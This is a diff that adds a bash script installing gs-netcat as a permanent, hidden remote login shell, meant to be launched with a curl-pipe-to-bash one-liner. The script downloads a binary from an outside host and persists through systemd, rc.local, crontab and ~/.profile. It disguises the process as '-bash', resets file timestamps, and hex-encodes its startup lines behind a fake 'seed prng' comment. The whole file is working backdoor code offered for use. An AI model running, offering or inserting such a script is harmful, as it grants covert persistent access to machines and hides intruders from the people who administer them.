@@ -1,0 +1,664 @@
+#! /usr/bin/env bash
+
+# Install and start a permanent gs-netcat remote login shell
+#
+# This script is typically invoked like this as root or non-root user:
+#   $ bash -c"$(curl -fsSL gsocket.io/x)"
+#
+# Pre-set a secret:
+#   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+# Uninstall
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
+# Access
+#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
+#
+#
+# This can be used when:
+# - gs-netcat is _not_ installed
+# - quick way to retain access to any shell (root and non-root)
+#
+# E.g. This command installs and starts a reverse shell:
+# $ bash -c "$(curl -fsSL gsocket.io/x)"
+#
+# Steps taken:
+# 1. Download pre-compiled binary
+# 2. Create a new secret (random)
+# 3. Start gs-netcat as interactive remote login shell
+# 4. Install gs-netcat to start automatically after reboot
+
+# Global Defines
+URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
+URL_DEPLOY="gsocket.io/x"
+DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
+# DL_CMD="$DL_CRL"
+BIN_HIDDEN_NAME_DEFAULT=gs-bd
+PROC_HIDDEN_NAME_DEFAULT=-bash
+CY="\033[1;33m" # yellow
+CG="\033[1;32m" # green
+CR="\033[1;31m" # red
+CC="\033[1;36m" # cyan
+CM="\033[1;35m" # magenta
+CN="\033[0m"    # none
+
+exit_clean()
+{
+	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR:?}/"*; rmdir "${TMPDIR}"; } &>/dev/null
+	rm -rf "${GS_PREFIX}/etc/rc.local-old" &>/dev/null
+	rm -rf "${GS_PREFIX}/etc/rc.local-new" &>/dev/null
+}
+
+exit_code()
+{
+	exit_clean
+
+	exit "$1"
+}
+
+errexit()
+{
+	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"
+
+	exit_code 255
+}
+
+# When all was successfull
+exit_alldone()
+{
+	echo 1>&1 "$*"
+	exit_code 0
+}
+
+# Called _after_ init_vars() at the end of init_setup.
+init_dstbin()
+{
+	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
+	# Try systemwide installation first
+	touch "$DSTBIN" &>/dev/null && { return; }
+
+	# Try user installation
+	mkdir -p "${GS_PREFIX}${HOME}/.usr/bin" &>/dev/null
+	DSTBIN="${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
+	touch "$DSTBIN" &>/dev/null && { return; }
+
+	# Try /dev/shm 
+	DSTBIN="/dev/shm/${BIN_HIDDEN_NAME}"
+	touch "$DSTBIN" &>/dev/null && { return; }
+
+	# Try /tmp/.gs as last resort
+	DSTBIN="${TMPDIR}/${BIN_HIDDEN_NAME}"
+	touch "$DSTBIN" &>/dev/null && { return; }
+	
+	errexit "FAILED. Can not find writeable directory."
+}
+
+init_vars()
+{
+	# Select binary
+	local arch
+	arch=$(uname -m)
+	if [[ $OSTYPE == *linux* ]]; then 
+		if [[ x"$arch" == "xi686" ]]; then
+			if [[ $(uname -r) == *arch* ]]; then
+				SRC_PKG="gs-netcat_i686-arch.tar.gz"
+			else
+				SRC_PKG="gs-netcat_i686-debian.tar.gz"
+			fi
+		elif [[ x"$arch" == "xarmv6l" ]]; then
+			SRC_PKG="gs-netcat_armv6l-linux.tar.gz"
+		else
+			if [[ $(uname -r) == *arch* ]]; then
+				SRC_PKG="gs-netcat_x86_64-arch.tar.gz"
+			else
+				SRC_PKG="gs-netcat_x86_64-debian.tar.gz"
+			fi
+		fi
+	elif [[ $OSTYPE == *darwin* ]]; then
+			SRC_PKG="gs-netcat_x86_64-osx.tar.gz"
+	elif [[ $OSTYPE == *FreeBSD* ]]; then
+			SRC_PKG="gs-netcat_x86_64-freebsd.tar.gz"
+	elif [[ $OSTYPE == *cygwin* ]]; then
+			SRC_PKG="gs-netcat_x86_64-cygwin.tar.gz"
+	fi
+
+	if grep Alpine /etc/issue &>/dev/null; then
+		SRC_PKG="gs-netcat_x86_64-alpine.tar.gz"
+	fi
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_x86_64-debian.tar.gz" # Try debian 64bit as last resort
+
+	if [[ -d /dev/shm ]]; then
+		TMPDIR="/dev/shm/.gs"
+	elif [[ -d /tmp ]]; then
+		TMPDIR="/tmp/.gs"
+	fi
+
+	# Docker does not set USER
+	[[ -z $USER ]] && USER=$(id -un)
+	[[ -z $UID ]] && UID=$(id -u)
+
+	# OSX's pkill matches the hidden name and not the original binary name.
+	# Because we hide as '-bash' we can not pkill all -bash.
+	# 'killall' however matches gs-bd and on OSX we thus force killall
+	if [[ $OSTYPE == *darwin* ]]; then
+		KL_CMD="killall"
+		KL_CMD_UARG="-u${USER}"
+	elif command -v pkill >/dev/null; then
+		KL_CMD="pkill"
+		KL_CMD_UARG="-U${UID}"
+	elif command -v killall >/dev/null; then
+		KL_CMD="killall"
+		# cygwin's killall needs the name (not the uid)
+		KL_CMD_UARG="-u${USER}"
+	fi
+
+	# command -v "$KL_CMD" >/dev/null || WARM_OUT "No pkill or killall found."
+	# command -v "$KL_CMD" >/dev/null || errexit "Need pkill or killall."
+
+	# Defaults
+	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
+	
+	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
+	PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
+
+	RCLOCAL_DIR="${GS_PREFIX}/etc"
+	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
+
+	RC_FILE="${GS_PREFIX}${HOME}/.profile"
+
+	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
+	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
+
+}
+
+init_setup()
+{
+	if [[ -n "$GS_PREFIX" ]]; then
+		# Debuggin and testing into separate directory
+		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
+		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
+		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
+		if [[ -f "${HOME}/.profile" ]]; then
+			cp "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
+			touch -r "${HOME}/.profile" "${GS_PREFIX}${HOME}/.profile"
+		fi
+		cp /etc/rc.local "${GS_PREFIX}/etc/"
+		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
+	fi
+
+	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
+	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
+	mkdir "$TMPDIR" &>/dev/null
+
+	touch "${TMPDIR}/.gs-${UID}.lock" || errexit "FAILED. No temporary directory found for downloading package."
+	rm -f "${TMPDIR}/.gs-${UID}.lock" 2>/dev/null
+
+	# Find out which directory is writeable
+	init_dstbin
+
+	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
+
+	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
+	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
+	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
+	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+
+	PROFILE_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
+	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+
+	if command -v xxd >/dev/null; then
+		local p
+		p="$(echo "$RCLOCAL_LINE" | xxd -ps -c1024)"
+		RCLOCAL_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+
+		p="$(echo "$PROFILE_LINE" | xxd -ps -c1024)"
+		PROFILE_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+
+		p="$(echo "$CRONTAB_LINE" | xxd -ps -c1024)"
+		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+	fi	
+}
+
+uninstall_rm()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -f "$1" ]] && return # return if file does not exist
+
+	echo 1>&2 "Removing $1..."
+	rm -rf "$1"
+}
+
+uninstall_rmdir()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -d "$1" ]] && return # return if file does not exist
+
+	echo 1>&2 "Removing $1..."
+	rmdir "$1"
+}
+
+uninstall_rc()
+{
+	[[ ! -f "$1" ]] && return # File does not exist
+
+	grep "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed
+
+	grep -v "${BIN_HIDDEN_NAME}" "$1" >"${1}-new" 2>/dev/null
+	[[ ! -f "${1}-new" ]] && return # permission denied
+
+	touch -r "$1" "${1}-new"
+	mv "${1}-new" "$1"
+	[[ ! -s "${1}" ]] && rm -f "${1}" 2>/dev/null # delete zero size file
+}
+
+# Rather important function especially when testing and developing this...
+uninstall()
+{
+	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
+	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
+	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
+
+	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
+	uninstall_rm "${GS_PREFIX}${HOME}/.usr/bin/${SEC_NAME}"
+	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
+	uninstall_rm "/dev/shm/${SEC_NAME}"
+
+	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr/bin"
+	uninstall_rmdir "${GS_PREFIX}${HOME}/.usr"
+
+	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
+	uninstall_rm "${TMPDIR}/${SRC_PKG}"
+	uninstall_rmdir "${TMPDIR}"
+
+	# Remove from login script
+	uninstall_rc "${GS_PREFIX}${HOME}/.profile"
+	uninstall_rc "${GS_PREFIX}/etc/rc.local"
+
+	# Remove crontab
+	if [[ ! $OSTYPE == *darwin* ]]; then
+		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v "${BIN_HIDDEN_NAME}" | crontab - 2>/dev/null 
+	fi
+
+	# Remove systemd service
+	# STOPPING would kill the current login shell. Do not stop it.
+	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
+	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; } 
+	uninstall_rm "${SERVICE_FILE}"
+	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
+
+	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
+	echo -e 1>&2 "--> Use ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
+	exit 0
+}
+
+SKIP_OUT()
+{
+	echo -e 1>&2 "[${CY}SKIPPING${CN}]"
+	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+}
+
+OK_OUT()
+{
+	echo -e 1>&2 "......[${CG}OK${CN}]"
+	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+}
+
+FAIL_OUT()
+{
+	echo -e 1>&2 "..[${CR}FAILED${CN}]"
+	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+}
+
+WARN()
+{
+	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
+}
+
+WARN_EXECFAIL()
+{
+	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
+	echo -e 1>&2 "--> CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+}
+
+gs_secret_reload()
+{
+	[[ ! -f "$1" ]] && WARN "Oops. $1 not found. Uninstall needed?"
+	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
+	local sec
+	sec=$(<"$1")
+	[[ ${#sec} -gt 10 ]] && GS_SECRET=$sec
+}
+
+gs_secret_write()
+{
+	echo "$GS_SECRET" >"$1"
+	chmod 600 "$1"
+}
+
+install_system_systemd()
+{
+	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
+	command -v systemctl >/dev/null || return
+	if [[ -f "${SERVICE_FILE}" ]]; then
+		IS_INSTALLED=1
+		IS_SKIPPED=1
+		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+			IS_GS_RUNNING=1
+		fi
+		IS_SYSTEMD=1
+		gs_secret_reload "$SYSTEMD_SEC_FILE" 
+		SKIP_OUT "${SERVICE_FILE} already exists."
+		return
+	fi
+
+	# Create the service file
+	echo "[Unit]
+Description=gs
+After=network.target
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=10
+WorkingDirectory=/root
+ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\"
+
+[Install]
+WantedBy=multi-user.target" >"${SERVICE_FILE}"
+
+	chmod 600 "${SERVICE_FILE}"
+	gs_secret_write "$SYSTEMD_SEC_FILE"
+
+	(systemctl enable "${SERVICE_HIDDEN_NAME}" && \
+	systemctl start "${SERVICE_HIDDEN_NAME}" && \
+	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work...
+
+	IS_SYSTEMD=1
+	IS_GS_RUNNING=1
+	IS_INSTALLED=1
+}
+
+install_system_rclocal()
+{
+	[[ ! -f "${RCLOCAL_FILE}" ]] && return
+	if grep "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
+		IS_INSTALLED=1
+		IS_SKIPPED=1
+		gs_secret_reload "$RCLOCAL_SEC_FILE" 
+		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
+		return	
+	fi
+
+	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
+	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
+	(head -n1 "${RCLOCAL_FILE}" && \
+	echo "$NOTE_DONOTREMOVE" && \
+	echo "$RCLOCAL_LINE" && \
+	tail -n +2 "${RCLOCAL_FILE}") >"${RCLOCAL_FILE}-new" 2>/dev/null || return # not writeable
+
+	# restore file's timestamp
+	touch -r "${RCLOCAL_FILE}" "${RCLOCAL_FILE}-new"
+	mv "${RCLOCAL_FILE}-new" "${RCLOCAL_FILE}"
+
+	gs_secret_write "$RCLOCAL_SEC_FILE"
+
+	IS_INSTALLED=1
+}
+
+install_system()
+{
+	echo -en 2>&1 "Installing systemwide remote access permanentally....................."
+
+	# Try systemd first
+	install_system_systemd
+
+	# Try good old /etc/rc.local
+	[[ -z $IS_INSTALLED ]] && install_system_rclocal
+
+	[[ -z $IS_INSTALLED ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
+
+	OK_OUT
+}
+
+install_user_crontab()
+{
+	command -v crontab >/dev/null || return # no crontab
+	echo -en 2>&1 "Installing access via crontab........................................."
+	[[ -z $KL_CMD ]] && { FAIL_OUT "No pkill or killall found."; return; }
+	if crontab -l 2>/dev/null | grep "$BIN_HIDDEN_NAME" &>/dev/null; then
+		IS_INSTALLED=1
+		IS_SKIPPED=1
+		gs_secret_reload "$USER_SEC_FILE"
+		SKIP_OUT "Already installed in crontab."
+		return
+	fi
+
+	local cr_time
+	cr_time="59 * * * *"
+	[[ -n $GS_DEBUG ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
+	(crontab -l 2>/dev/null && \
+	echo "$NOTE_DONOTREMOVE" && \
+	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }
+
+	IS_INSTALLED=1
+	OK_OUT
+}
+
+install_user_profile()
+{
+	echo -en 2>&1 "Installing access via ~/.profile......................................"
+	[[ -z $KL_CMD ]] && { FAIL_OUT "No pkill or killall found."; return; }
+	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
+	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
+		IS_INSTALLED=1
+		IS_SKIPPED=1
+		gs_secret_reload "$USER_SEC_FILE"
+		SKIP_OUT "Already installed in ${RC_FILE}"
+		return
+	fi
+
+	(echo "$NOTE_DONOTREMOVE" && \
+	echo "${PROFILE_LINE}" && \
+	cat "${RC_FILE}") >"${RC_FILE}-new"
+
+	touch -r "${RC_FILE}" "${RC_FILE}-new"
+	mv "${RC_FILE}-new" "${RC_FILE}"
+
+	IS_INSTALLED=1
+	OK_OUT
+}
+
+install_user()
+{
+	# Do not use crontab on OSX: It pops a warning to the user
+	if [[ ! $OSTYPE == *darwin* ]]; then
+		install_user_crontab
+	fi
+
+	# install_user_profile
+	install_user_profile
+
+	[[ -z $IS_SKIPPED ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
+}
+
+# Download $1 and save it to $2
+dl()
+{
+	[[ -s "$2" ]] && return
+
+	local dl_log
+
+	# Need to set DL_CMD before GS_DEBUG check for proper error output
+	if command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
+	# Debugging / testing. Use local package if available
+	[[ -n "$GS_DEBUG" ]] && [[ -f "../tools/${1}" ]] && cp "../tools/${1}" "${2}" 2>/dev/null && return
+
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
+		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
+		dl_log=$(wget --show-progress -O "$2" "${URL_BASE}/${1}" 2>&1)
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "CAN NOT HAPPEN"
+		errexit
+	fi
+
+	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
+	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$dl_log"; exit_code 255; } 
+}
+
+# S= was set. Do not install but execute in place.
+gs_access()
+{
+	echo -e 2>&1 "Connecting..."
+	local ret
+	GS_SECRET="${S}"
+
+	"${TMPDIR}/gs-netcat" -s "${GS_SECRET}" -i
+	ret=$?
+	[[ $ret -eq 139 ]] && { EXECFAIL_OUT "$?" "SIGSEGV"; errexit; }
+
+	exit_code "$ret"
+}
+
+# binaries are in TMPDIR. Perform a functional test.
+# test_binaries <binary> <no_exec_test=1>
+test_binaries()
+{
+	local bin
+	local no_exec_test
+	bin="$1"
+	no_exec_test="$2"
+	GS_SECRET=$("$bin" -g)
+	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "wrong binary"; errexit; }
+
+	# Only run exec test if installed with -l (not for gs_access)
+	[[ -n $no_exec_test ]] && return # no exec test (S= was specified)
+
+	# Connect to a random host to test binary, resolver and network connectivity.
+	local secret
+	secret=$("$bin" -g)
+	local log
+	log=$(GSOCKET_ARGS="-s selftest-${secret}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
+
+	ret=$?
+	[[ $ret -eq 139 ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "SIGSEGV"; errexit; }
+	[[ $ret -ne 255 ]] && { FAIL_OUT; echo "$log"; errexit; }
+}
+
+init_vars
+
+[[ x"$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
+[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
+
+init_setup
+
+# Download binaries
+echo -en 2>&1 "Downloading binaries.................................................."
+dl "$SRC_PKG" "${TMPDIR}/${SRC_PKG}"
+OK_OUT
+
+echo -en 2>&1 "Unpacking binaries...................................................."
+# Unpack
+(cd "${TMPDIR}" && tar xfz "${SRC_PKG}" && chmod 700 "${TMPDIR}/gs-netcat") || { FAIL_OUT "unpacking failed"; errexit; }
+OK_OUT
+
+echo -en 2>&1 "Testing binaries......................................................"
+test_binaries "${TMPDIR}/gs-netcat" "${S}" # Also sets GS_SECRET
+OK_OUT
+
+# S= is set. Do not install but connect to remote using S= as secret.
+[[ -n $S ]] && gs_access
+
+echo -en 2>&1 "Copying binaries......................................................"
+mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+chmod 700 "$DSTBIN"
+OK_OUT
+
+# User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+[[ -n $X ]] && GS_SECRET="$X"
+
+# -----BEGIN Install permanentally-----
+# Try to install system wide. This may also start the service.
+[[ $UID -eq 0 ]] && install_system
+
+# Try to install to user's login script or crontab
+[[ -z $IS_INSTALLED ]] && install_user
+# -----END Install permanentally-----
+
+if [[ -z "$IS_INSTALLED" ]]; then
+	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
+fi
+# After all install attempts output help how to uninstall
+echo -e 1>&2 "--> To uninstall type ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+
+printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
+if [[ -n "$IS_SYSTEMD" ]]; then
+	# HERE: It's systemd
+	if [[ -z "$IS_GS_RUNNING" ]]; then
+		systemctl start "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+			IS_GS_RUNNING=1
+		else
+			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
+			exit_code 255
+		fi
+	fi
+	if [[ -n "$IS_SKIPPED" ]]; then
+		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+	else
+		OK_OUT
+	fi
+elif [[ -z "$IS_GS_RUNNING" ]]; then
+	# Scenario to consider:
+	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
+	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
+	# Now two gs-bd's are running (which is correct)
+	if [[ -n $KL_CMD ]]; then
+		${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	elif command -v pidof >/dev/null; then
+		# if no pkill/killall then try pidof (but we cant tell which user...)
+		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
+			IS_OLD_RUNNING=1
+		fi
+	fi
+	IS_NEED_START=1
+
+	if [[ -n "$IS_OLD_RUNNING" ]]; then
+		# HERE: already running.
+		if [[ -n "$IS_SKIPPED" ]]; then
+			# HERE: Already running. Skipped installation (sec.dat has not changed).
+			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+			unset IS_NEED_START
+		else
+			OK_OUT
+			WARN "More than one ${BIN_HIDDEN_NAME} is running. You"
+			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
+			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN}"
+		fi
+	else
+		OK_OUT ""
+	fi
+
+	if [[ -n "$IS_NEED_START" ]]; then
+		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
+		IS_GS_RUNNING=1
+	fi
+fi
+
+echo -e 1>&2 "--> To connect type one of the following:
+--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+
+
+exit_code 0
